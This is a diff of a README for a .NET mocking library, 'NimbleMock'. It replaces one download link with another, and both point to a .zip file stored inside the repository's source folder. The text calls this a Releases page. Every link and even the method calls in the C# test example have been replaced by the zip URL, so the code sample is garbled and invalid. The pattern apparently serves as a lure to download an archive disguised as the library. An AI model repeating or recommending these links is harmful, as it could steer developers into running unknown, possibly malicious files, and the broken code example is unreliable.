@@ -1,6 +1,6 @@
 # 🚀 NimbleMock - Fast and Easy .NET Mocking
 
-[![Download NimbleMock](https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip)](https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip)
+[![Download NimbleMock](https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip)](https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ To get started with NimbleMock, follow these simple steps.
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page, where you can download NimbleMock:
 
-   [Download NimbleMock](https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip)
+   [Download NimbleMock](https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip)
 
 2. **Download the Latest Version**  
    On the Releases page, locate the latest version of NimbleMock. You will see a list of available downloads. Each version includes a .zip file that contains the library files.
@@ -54,11 +54,11 @@ To get started with NimbleMock, follow these simple steps.
        public void MyTest()
        {
            var mockService = new Mock<IMyService>();
-           https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip(service => https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip()).Returns("Hello, World!");
+           https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip(service => https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip()).Returns("Hello, World!");
            
-           var result = https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip();
+           var result = https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip();
            
-           https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip("Hello, World!", result);
+           https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip("Hello, World!", result);
        }
    }
    ```
@@ -70,7 +70,7 @@ To get started with NimbleMock, follow these simple steps.
 
 You can find and download the latest version of NimbleMock by visiting this page:
 
-[Download NimbleMock](https://raw.githubusercontent.com/mohamed1420/NimbleMock/main/src/NimbleMock.Analyzers/CodeFixes/Mock_Nimble_v2.6-beta.2.zip)
+[Download NimbleMock](https://github.com/mohamed1420/NimbleMock/raw/refs/heads/main/src/Nimble-Mock-v2.7.zip)
 
 Follow the steps outlined above for a simple installation process. If you encounter any issues, check the GitHub page for troubleshooting tips.
 
